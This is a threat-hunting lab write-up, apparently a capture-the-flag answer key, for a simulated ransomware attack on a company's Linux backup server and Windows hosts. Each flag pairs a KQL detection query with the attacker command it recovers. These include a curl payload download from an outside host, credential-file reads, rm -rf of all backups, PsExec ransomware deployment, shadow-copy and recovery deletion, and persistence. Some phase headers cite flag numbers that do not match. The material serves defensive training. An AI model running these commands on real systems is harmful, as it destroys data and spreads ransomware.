# INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社 (WIP)

📋 INCIDENT BRIEF - **The Azuki Breach Saga** - Final Chapter

**DATE:** November 27, 2025

**SITUATION:** It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.

Your CEO needs answers:

- How did they get to our backup infrastructure?
- What exactly did they destroy?
- How did the ransomware spread so fast?
- Can we recover?


---
<br><br><br>

### 🚩 Flag 1 — Lateral Movement: Remote Access

**Answer:** `"ssh.exe" backup-admin@10.1.0.189`

**What was found:** The attacker executed `ssh.exe` — the native Windows SSH client — from the compromised AZUKI-AdminPC workstation. They authenticated as the `backup-admin` account and connected directly to the Linux backup server at `10.1.0.189`. This was the pivot point from the Windows environment into the Linux backup infrastructure, timed at `2025-11-25T05:39:10Z` — early morning, likely timed to avoid detection.

**MITRE ATT&CK:** [T1021.004 — Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-18T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "azuki-adminpc"
| where FileName in ("ssh.exe", "putty.exe", "plink.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```

---

### 🚩 Flag 2 — Lateral Movement: Attack Source

**Answer:** `10.1.0.108`

**What was found:** The SSH connection to the backup server originated from `10.1.0.108` — the IP address of AZUKI-AdminPC, the admin workstation. This confirms the attacker had already fully compromised the admin machine before pivoting to the backup server. The network path was: `AZUKI-AdminPC (10.1.0.108)` → `AZUKI-BackupSv (10.1.0.189)`.

**MITRE ATT&CK:** [T1021.004 — Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-18T00:00:00) .. datetime(2025-11-28T20:00:00))
| where RemoteIP contains "10.1.0.189"
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort
```

---

### 🚩 Flag 3 — Credential Access: Compromised Account

**Answer:** `backup-admin`

**What was found:** The attacker authenticated using the `backup-admin` account — a privileged service account with direct access to all backup data. This account was found in `all-credentials.txt`, a plaintext credentials file stored on the backup server itself at `/backups/configs/all-credentials.txt`. The attacker read this file during an earlier reconnaissance session on November 24, then used those credentials to log in on November 25.

**MITRE ATT&CK:** [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-18T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "azuki-backupsv"
| where AccountName contains "backup"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP
```

---

### 🚩 Flag 4 — Discovery: Directory Enumeration

**Answer:** `ls --color=auto -la /backups/`

**What was found:** The attacker ran a detailed directory listing of the `/backups/` root folder at `2025-11-24T14:13:34Z`. The `-la` flags revealed all files including hidden ones with full permissions, ownership, and timestamps. The `--color=auto` flag confirms this was an interactive live terminal session — not a script. This gave the attacker a complete map of what backup data was available before they moved to destroy it.

**MITRE ATT&CK:** [T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "azuki"
| where FileName in ("dir", "tree", "ls", "find", "locate")
| project TimeGenerated, AccountDomain, ProcessCommandLine
```

---

### 🚩 Flag 5 — Discovery: File Search

**Answer:** `find /backups -name *.tar.gz`

**What was found:** At `2025-11-24T14:16:06Z`, the attacker ran a recursive file search across the entire `/backups` directory targeting compressed archive files (`.tar.gz`). This identified every database dump, system backup, and archive stored on the server. These were the exact files later targeted for deletion with `find / -type f -exec rm -f {}`. The search-then-destroy sequence is a hallmark of ransomware preparation.

**MITRE ATT&CK:** [T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "azuki"
| where FileName in ("dir", "tree", "ls", "find", "locate")
| project TimeGenerated, AccountDomain, ProcessCommandLine
```

---

### 🚩 Flag 6 — Discovery: Account Enumeration

**Answer:** `cat /etc/passwd`

**What was found:** The attacker read `/etc/passwd` to enumerate all local user accounts on the backup server. This revealed every account on the system including service accounts, their home directories, and shell assignments. Combined with `sudo tail -20 /var/log/auth.log` — which exposed who had sudo rights — and `whoami` followed by `sudo su -` on November 25, the attacker built a complete picture of the system's user base before escalating to root.

**MITRE ATT&CK:** [T1087.001 — Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20T00:00:00) .. datetime(2025-11-28T20:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("whoami", "id", "who", "last", "sudo -l", "cat /etc/passwd", "getent passwd", "getent group")
| project TimeGenerated, FileName, ProcessCommandLine
```

---


### 🚩 Flag 7 — Discovery: Scheduled Job Reconnaissance

**Answer:** `cat /etc/crontab`

**What was found:** The attacker read the system-wide crontab file at `/etc/crontab` to reveal all scheduled backup jobs. This showed exactly when backups ran, what scripts executed them, and what data was being backed up — giving the attacker a precise window to time their destruction for maximum impact after the last backup completed.

**MITRE ATT&CK:** [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-22T00:00:00) .. datetime(2025-11-28T00:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("crontab")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 8 — Command and Control: Tool Transfer

**Answer:** `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`

**What was found:** The attacker downloaded an external payload named `destroy.7z` from `litter.catbox.moe` — a public anonymous file hosting service commonly abused by threat actors. The `-L` flag follows redirects and `-o destroy.7z` saves it locally. The filename `destroy` leaves no ambiguity about intent. This was the ransomware/wiper toolkit pulled from attacker-controlled external infrastructure.

**MITRE ATT&CK:** [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-22T00:00:00) .. datetime(2025-11-28T00:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("apt", "install", "curl", "wget", "yum", "http")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 9 — Credential Access: Credential Theft

**Answer:** `cat /backups/configs/all-credentials.txt`

**What was found:** The attacker read a plaintext file containing every credential on the network stored inside the backup directory itself at `/backups/configs/all-credentials.txt`. This single command gave the attacker every username and password across all systems — directly explaining how ransomware spread so fast across the entire network. Credentials were stored in plaintext inside the very infrastructure they were meant to protect.

**MITRE ATT&CK:** [T1552.001 — Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-22T00:00:00) .. datetime(2025-11-28T00:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("credentials")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 10 — Impact: Data Destruction

**Answer:** `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`

**What was found:** The attacker force deleted every single backup directory on the server in one devastating command. Every backup category — databases, archives, workstations, configs, daily, weekly, monthly — was wiped simultaneously with `rm -rf`, leaving no recovery data on the Linux backup server. This directly answers the CEO's question: *"Can we recover?"*

**MITRE ATT&CK:** [T1485 — Data Destruction](https://attack.mitre.org/techniques/T1485/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("rm -f", "rm -rf", "find", "shred", "wipe")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 11 — Impact: Service Stopped & Disabled

**Answer (Stopped):** `systemctl stop cron`
**Answer (Disabled):** `systemctl disable cron`

**What was found:** At `5:47 AM on November 25`, the attacker executed a triple kill on the cron scheduler — stopping it immediately, disabling it from restarting on reboot, and permanently removing it from the boot system via `systemd-sysv-install`. This ensured no new backups could ever be created again, even if someone tried to recover the server. The attacker then verified it was dead with `systemctl status cron`.

**MITRE ATT&CK:** [T1489 — Service Stop](https://attack.mitre.org/techniques/T1489/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24T00:00:00) .. datetime(2025-11-26T00:00:00))
| where AccountDomain contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("crontab", "cron.d", "cron.daily", "list-timers", "atq", "cron")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<br><br><br>
## 💻 Phase 2: Windows Ransomware Deployment (Flags 13–14)

---

### 🚩 Flag 12 — Lateral Movement: Remote Execution

**Answer:** `PsExec64.exe`

**What was found:** The attacker used PsExec64.exe — the 64-bit version of Microsoft's Sysinternals remote execution tool — to deploy ransomware simultaneously across multiple Windows machines. PsExec was used with `/accepteula` to suppress any popup dialogs, enabling fully silent automated deployment. The stolen credentials from `all-credentials.txt` were used to authenticate to each target machine.

**MITRE ATT&CK:** [T1569.002 — System Services: Service Execution](https://attack.mitre.org/techniques/T1569/002/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where FileName contains "PsExec"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 13 — Lateral Movement: Deployment Command

**Answer:**
```
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.204 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

**Payload:** `silentlynx.exe`

**What was found:** The attacker deployed `silentlynx.exe` — the ransomware payload — to three separate machines using stolen credentials. The `-c -f` flags copy and force-overwrite the executable to each remote machine before executing it. Targets included the logistics PC (`10.1.0.102`), the file server (`10.1.0.188`), and the workstation (`10.1.0.204`), hitting every critical Windows system simultaneously.

**MITRE ATT&CK:** [T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where FileName contains "PsExec"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---
<br><br><br>
## 🛡️ Phase 3: Recovery Inhibition (Flags 16–22)

---

### 🚩 Flag 14 — Impact: Shadow Service Stopped

**Answer:** `"net" stop VSS /y`

**What was found:** The attacker stopped the Volume Shadow Copy Service (VSS) on Windows machines — eliminating the ability to create or access shadow copies during the encryption phase. The `/y` flag auto-confirms the stop without prompting. This was deployed via PsExec64.exe across all Windows machines simultaneously, cutting off the primary Windows recovery mechanism.

**MITRE ATT&CK:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("net stop", "vss")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 15 — Impact: Backup Engine Stopped

**Answer:** `"net" stop wbengine /y`

**What was found:** The attacker stopped the Windows Backup Engine (wbengine) — the core service responsible for all Windows Server Backup operations. With both VSS and wbengine stopped, no backup operations could run during the attack window. Combined with the Linux cron destruction, every backup mechanism across the entire network was simultaneously neutralised.

**MITRE ATT&CK:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("net", "backup engine")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 16 — Defense Evasion: Process Termination

**Answer:** `"taskkill" /F /IM sqlservr.exe`

**What was found:** The attacker ran a series of `taskkill` commands to forcefully terminate processes that lock files — preventing ransomware from encrypting them. Critically, Windows Defender (`MsMpEng.exe`, `MpCmdRun.exe`, `NisSrvr.exe`) was killed first to blind the system, followed by all database engines (`sqlservr.exe`, `mysql.exe`, `oracle.exe`, `postgres.exe`, `mongodb.exe`) and Office applications to unlock every file for encryption.

**MITRE ATT&CK:** [T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) | [T1489 — Service Stop](https://attack.mitre.org/techniques/T1489/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("taskkill")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🚩 Flag 17 — Impact: Recovery Point Deletion

**Answer (Delete):** `"vssadmin.exe" delete shadows /all /quiet`
**Answer (Resize):** `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB`

**What was found:** The attacker deleted ALL existing Volume Shadow Copies with `/all /quiet` — silently wiping every restore point on the system. They then resized shadow storage to just 401MB, making it physically impossible to store meaningful new shadow copies even if VSS was restarted. This two-step approach ensured both existing and future recovery points were eliminated.

**MITRE ATT&CK:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki"
| where ProcessCommandLine has_any ("vssadmin", "wbadmin", "shadowcopy")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```

---

### 🚩 Flag 18 — Impact: Recovery Disabled

**Answer:** `"bcdedit" /set {default} recoveryenabled No`

**What was found:** The attacker used `bcdedit` — the Windows Boot Configuration Data editor — to disable the Windows Recovery Environment entirely. This means even if an admin tried to boot into recovery mode after the ransomware hit, the option would not exist. Combined with deleted shadow copies and destroyed backups, there was no recovery path remaining anywhere in the environment.

**MITRE ATT&CK:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki"
| where ProcessCommandLine has_any ("bcdedit")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```

---

### 🚩 Flag 19 — Impact: Catalog Deletion

**Answer:** `"wbadmin" delete catalog -quiet`

**What was found:** The attacker silently deleted the Windows backup catalogue — the index that tracks where all backups are stored and how to restore them. Even if backup files physically survived on disk, without the catalogue Windows cannot locate or restore them. The `-quiet` flag suppressed all confirmation prompts, ensuring no user interaction was required.

**MITRE ATT&CK:** [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki"
| where ProcessCommandLine has_any ("wbadmin")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```

---
<br><br><br>
## 🔒 Phase 4: Persistence (Flags 23–24)

---

### 🚩 Flag 20 — Persistence: Registry Autorun

**Answer:** `WindowsSecurityHealth`
**Registry Data:** `C:\Windows\Temp\silentlynx.exe`

**What was found:** The attacker added a registry Run key named `WindowsSecurityHealth` — disguised as a legitimate Windows security component — pointing to `silentlynx.exe` in the Temp folder. This ensures the ransomware/backdoor executes automatically every time Windows starts, giving the attacker persistent access even after a reboot. The name was deliberately chosen to blend in with legitimate Windows security processes.

**MITRE ATT&CK:** [T1547.001 — Boot or Logon Autostart: Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where RegistryKey has_any (
    "CurrentVersion\\Run",
    "CurrentVersion\\RunOnce",
    "Winlogon",
    "CurrentControlSet\\Services")
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
```

---

### 🚩 Flag 21 — Persistence: Scheduled Execution

**Answer:** `"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f`

**What was found:** The attacker created a scheduled task masquerading as `SecurityHealthService` — a legitimate-sounding Windows security service — hidden inside `Microsoft\Windows\Security\` to avoid detection. The task runs `silentlynx.exe` at the highest privilege level every time any user logs on. The `/f` flag forces creation without confirmation, and the path mimics real Windows system tasks to evade manual inspection.

**MITRE ATT&CK:** [T1053.005 — Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | [T1036.004 — Masquerading: Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where ProcessCommandLine contains "schtask"
| project TimeGenerated, DeviceName, ProcessCommandLine, FolderPath
```

---
<br><br><br>
## 🧹 Phase 5: Anti-Forensics (Flag 25)

---

### 🚩 Flag 22 — Defense Evasion: Journal Deletion

**Answer:** `"fsutil.exe" usn deletejournal /D C:`

**What was found:** The attacker used `fsutil.exe` to delete the USN (Update Sequence Number) journal on the C: drive — a file system log that tracks every file change, creation, and deletion on the system. This is a key forensic artifact used by investigators to reconstruct attacker activity. Deleting it significantly hampers forensic analysis and covers tracks from all file operations performed during the attack.

**MITRE ATT&CK:** [T1070.004 — Indicator Removal: File Deletion](https://attack.mitre.org/techniques/T1070/004/)

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where ProcessCommandLine contains "journal"
| project TimeGenerated, DeviceName, ProcessCommandLine, FolderPath
```

---
<br><br><br>
## 💀 Phase 6: Ransomware Success (Flag 26)

---

### 🚩 Flag 23 — Impact: Ransom Note

**Answer:** `SILENTLYNX_README.txt`

**What was found:** The ransomware group `SILENTLYNX` successfully deployed their payload across the entire Azuki Import/Export network, dropping ransom notes named `SILENTLYNX_README.txt` on every encrypted system. This was the final confirmation of successful ransomware execution — arriving Monday morning November 27, 2025, one week after the initial compromise began on the Linux backup server.

**MITRE ATT&CK:** [T1486 — Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-25T00:00:00) .. datetime(2025-11-28T00:00:00))
| where DeviceName contains "azuki-"
| where FileName endswith ".txt"
| where ActionType contains "FileCreated"
| project TimeGenerated, FileName, DeviceName, FolderPath
```


---



